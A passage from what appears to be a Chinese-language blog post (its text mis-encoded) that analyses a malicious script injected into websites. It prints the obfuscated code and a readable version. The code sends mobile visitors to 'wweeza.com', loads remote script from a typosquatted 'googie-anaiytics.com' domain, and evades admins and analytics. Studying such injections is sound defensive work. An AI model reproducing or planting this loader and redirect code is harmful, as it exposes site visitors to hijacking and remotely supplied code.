operator">&amp;&amp;</span>                  _0x2faa6e<span class="token punctuation">.</span><span class="token function">pqiqW</span><span class="token punctuation">(</span>_0x4742d9<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                    _0x2faa6e<span class="token punctuation">.</span><span class="token function">zbtQp</span><span class="token punctuation">(</span>_0x955e25<span class="token punctuation">,</span> _0x2faa6e<span class="token punctuation">.</span>volhE<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      _0x2faa6e<span class="token punctuation">.</span><span class="token function">OBmcC</span><span class="token punctuation">(</span>_0x4eb5f8<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                        <span class="token punctuation">(</span>_0x94c0a4<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> _0x1dbf3a<span class="token punctuation">)</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x3e7ea8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x2faa6e<span class="token punctuation">.</span><span class="token function">pgwSI</span><span class="token punctuation">(</span>_0x2faa6e<span class="token punctuation">.</span>XaDFm<span class="token punctuation">,</span> _0x2faa6e<span class="token punctuation">.</span>XaDFm<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    _0x2faa6e<span class="token punctuation">.</span><span class="token function">IzGuE</span><span class="token punctuation">(</span>_0x51047d<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_0x391f84 <span class="token operator">=</span> _0x40837e<span class="token punctuation">)</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">const</span> _0x47d725 <span class="token operator">=</span> <span class="token function">_0x3e7ea8</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_0x15452<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span>                    <span class="token keyword">return</span> <span class="token punctuation">(</span>_0x3e7ea8 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0x47d725                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>_0x2ddab7 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0x1c444b      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    _0x41d32e <span class="token operator">=</span> <span class="token function">_0x464cf7</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> _0x41d32e        <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token string">'(((.+)+)+)+$'</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>_0x41d32e<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token string">'(((.+)+)+)+$'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token function">_0x41d32e</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> _0x112e13 <span class="token operator">=</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>    <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span>  <span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x112e13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> _0x152838 <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>host<span class="token punctuation">,</span>      _0xc3b985 <span class="token operator">=</span> document<span class="token punctuation">.</span>referrer<span class="token punctuation">,</span>      _0x56bd89 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span>      _0x42c985 <span class="token operator">=</span> <span class="token string">'https://wweeza.com/redirect?from=bitget'</span><span class="token punctuation">,</span>      _0x57dc62 <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      _0x5462a8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      _0x394b64 <span class="token operator">=</span> _0x5462a8<span class="token punctuation">.</span><span class="token function">getHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>      _0x152838<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'www.dxtv1.com'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span>      _0x152838<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'www.ys752.com'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      _0x56bd89 <span class="token operator">=</span> <span class="token string">'https://wweeza.com/redirect?from=bitget'</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x152838<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'shuanshu.com.com'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        _0x56bd89 <span class="token operator">=</span> <span class="token string">'https://wweeza.com/redirect?from=bitget'</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>          _0xc3b985<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>          _0xc3b985<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>_0x152838<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span>        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          _0x56bd89 <span class="token operator">=</span> <span class="token string">'https://wweeza.com/redirect?from=bitget'</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x394b64 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> _0x394b64 <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            _0x57dc62 <span class="token operator">&lt;=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_0x56bd89 <span class="token operator">=</span> _0x42c985<span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x394b64 <span class="token operator">>=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> _0x394b64 <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              _0x57dc62 <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_0x56bd89 <span class="token operator">=</span> _0x42c985<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x394b64 <span class="token operator">>=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> _0x394b64 <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                _0x57dc62 <span class="token operator">&lt;=</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_0x56bd89 <span class="token operator">=</span> _0x42c985<span class="token punctuation">)</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x394b64 <span class="token operator">>=</span> <span class="token number">7</span> <span class="token operator">&amp;&amp;</span> _0x394b64 <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x57dc62 <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    _0x56bd89 <span class="token operator">=</span> _0x42c985                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  _0x57dc62 <span class="token operator">&lt;=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_0x56bd89 <span class="token operator">=</span> _0x42c985<span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    _0x56bd89 <span class="token operator">!=</span> <span class="token string">''</span> <span class="token operator">&amp;&amp;</span>      <span class="token operator">!</span><span class="token function">isPc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>      document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'admin_id'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>        document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'adminlevels'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">vfed_update</span><span class="token punctuation">(</span>_0x56bd89<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> tsastr <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>outerHTML<span class="token punctuation">,</span>  bdtjfg <span class="token operator">=</span> tsastr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'hm.baidu.com'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>  cnzfg <span class="token operator">=</span> tsastr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.cnzz.com'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>  wolafg <span class="token operator">=</span> tsastr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.51.la'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">let</span> mattoo <span class="token operator">=</span> tsastr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.matomo.org'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>  aanaly <span class="token operator">=</span> tsastr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.google-analytics.com'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>  ggmana <span class="token operator">=</span> tsastr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.googletagmanager.com'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>  aplausix <span class="token operator">=</span> tsastr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.plausible.io'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">let</span> statcct <span class="token operator">=</span> tsastr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.statcounter.com'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span>bdtjfg <span class="token operator">||</span> cnzfg <span class="token operator">||</span> wolafg <span class="token operator">||</span> mattoo <span class="token operator">||</span> aanaly <span class="token operator">||</span> ggmana <span class="token operator">||</span> aplausix <span class="token operator">||</span> statcct  <span class="token operator">?</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>check_tiaozhuan<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>  <span class="token operator">:</span> <span class="token function">check_tiaozhuan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€™æ™‚å€™å°±è¦å†æ¬¡äº¤çµ¦ ChatGPT å¤§ç¥ï¼Œä¸éœ€è¦ä»€éº¼é«˜æ·±çš„ promptï¼Œåªè¦è·Ÿä»–èªªæŠŠå®ƒå¯è®€æ€§è®Šå¥½å°±è¡Œï¼Œå°±å¯ä»¥å¾—åˆ°åº•ä¸‹çš„çµæœï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Function to load a JavaScript file dynamically and execute a callback once it's loaded</span><span class="token keyword">function</span> <span class="token function">loadJS</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> onLoadCallback <span class="token operator">=</span> callback <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  script<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'text/javascript'</span><span class="token punctuation">;</span>  script<span class="token punctuation">.</span>onload <span class="token operator">=</span> onLoadCallback<span class="token punctuation">;</span>  script<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>  document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'head'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Function to determine if the current device is a PC</span><span class="token keyword">function</span> <span class="token function">isPc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> isWindows <span class="token operator">=</span> navigator<span class="token punctuation">.</span>platform <span class="token operator">===</span> <span class="token string">'Win32'</span> <span class="token operator">||</span> navigator<span class="token punctuation">.</span>platform <span class="token operator">===</span> <span class="token string">'Windows'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> isMac <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Mac68K'</span><span class="token punctuation">,</span> <span class="token string">'MacPPC'</span><span class="token punctuation">,</span> <span class="token string">'Macintosh'</span><span class="token punctuation">,</span> <span class="token string">'MacIntel'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> isWindows <span class="token operator">||</span> isMac<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Function to check if any of the provided keywords exist in the document's HTML</span><span class="token keyword">function</span> <span class="token function">checkKeywords</span><span class="token punctuation">(</span><span class="token parameter">keywords</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> htmlContent <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> keyword <span class="token keyword">of</span> keywords<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>htmlContent<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Function to fetch keyword data and update the page if keywords match</span><span class="token keyword">function</span> <span class="token function">vfed_update</span><span class="token punctuation">(</span><span class="token parameter">redirectUrl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://www.googie-anaiytics.com/keywords/vn-keyword.json'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">keywords</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> keywordsFound <span class="token operator">=</span> <span class="token function">checkKeywords</span><span class="token punctuation">(</span>keywords<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>keywordsFound <span class="token operator">&amp;&amp;</span> redirectUrl<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">loadJS</span><span class="token punctuation">(</span><span class="token string">'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>usercache <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> redirectUrl<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error fetching the JSON file:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Function to handle page redirection based on certain conditions</span><span class="token keyword">function</span> <span class="token function">check_tiaozhuan</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> host <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>host<span class="token punctuation">;</span>    <span class="token keyword">const</span> referrer <span class="token operator">=</span> document<span class="token punctuation">.</span>referrer<span class="token punctuation">;</span>    <span class="token keyword">const</span> redirectBaseUrl <span class="token operator">=</span> <span class="token string">'https://wweeza.com/redirect?from=bitget'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> currentHour <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> redirectUrl <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'www.dxtv1.com'</span><span class="token punctuation">,</span> <span class="token string">'www.ys752.com'</span><span class="token punctuation">,</span> <span class="token string">'shuanshu.com.com'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token operator">||</span>        <span class="token punctuation">(</span>referrer<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>referrer<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      redirectUrl <span class="token operator">=</span> redirectBaseUrl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentHour <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> currentHour <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      redirectUrl <span class="token operator">=</span> redirectBaseUrl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentHour <span class="token operator">>=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> currentHour <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      redirectUrl <span class="token operator">=</span> redirectBaseUrl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentHour <span class="token operator">>=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> currentHour <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token operator">&amp;&amp;</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      redirectUrl <span class="token operator">=</span> redirectBaseUrl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentHour <span class="token operator">>=</span> <span class="token number">7</span> <span class="token operator">&amp;&amp;</span> currentHour <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token operator">&amp;&amp;</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      redirectUrl <span class="token operator">=</span> redirectBaseUrl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentHour <span class="token operator">>=</span> <span class="token number">8</span> <span class="token operator">&amp;&amp;</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      redirectUrl <span class="token operator">=</span> redirectBaseUrl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>redirectUrl <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'admin_id'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>document<span class="token 